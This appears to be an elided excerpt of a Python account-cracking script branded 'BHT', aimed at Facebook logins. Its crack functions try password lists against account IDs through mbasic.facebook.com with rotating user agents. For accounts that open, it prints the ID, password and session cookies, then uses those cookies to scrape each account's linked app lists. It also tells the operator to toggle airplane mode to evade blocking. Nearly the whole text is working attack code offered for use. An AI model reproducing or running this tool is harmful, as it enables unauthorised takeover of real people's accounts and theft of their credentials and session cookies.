...
def uaku():
	try:
		...
		a=requests.get('https://github.com/jahied/EC-170/blame/main/Ac.txt').text
		ua=open('.bbnew.txt','w')
...
def result():
	...
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
			...
			back()
		if len(vin)==0:
			print('=>Anda Tidak Memiliki BHT CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
...
def passwrd():
	...
	print(f'=>TURN AIRPLANE MODE AFTER CLONE IDZ  {h}1K{u} Idz\n')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}BHT-XD-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]тАФ{P}[{H}{ok}{P}]тАФ{P}[{k}{cp}{x}]тАФ[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [red]     тЬи BHT-CHECKPOINT тЬи [red]'))
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r {P}[{asu}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]тАФ{P}[{H}{ok}{P}]тАФ{P}[{k}{cp}{x}]тАФ[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(nel('[purple]      BH-TEAM OK[purple]')) 
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					statuscp = f'[BHT] ID       : {idf} [BHT] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='BHT-CP'))
				...
				if 'no' in taplikasi:
					...
					print('\n')
					statusok = f'[BHT] ID       : {idf}\n[BHT] PASSWORD : {pw}\n[BHT] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='BHT-OK'))
					ok+=1
					break
					...
					hit=0
					infoakun += (f"\n[bold yellow][BHT] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
					...
					print('\n')
					statusok = f'[bold green][BHT] ID       : {idf}\n[BHT] PASSWORD : {pw}\n[BHT] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]BHT-OK[/bold green]'))
					ok+=1
					break
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					infoakun += (f"\n[bold cyan][BHT] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n")
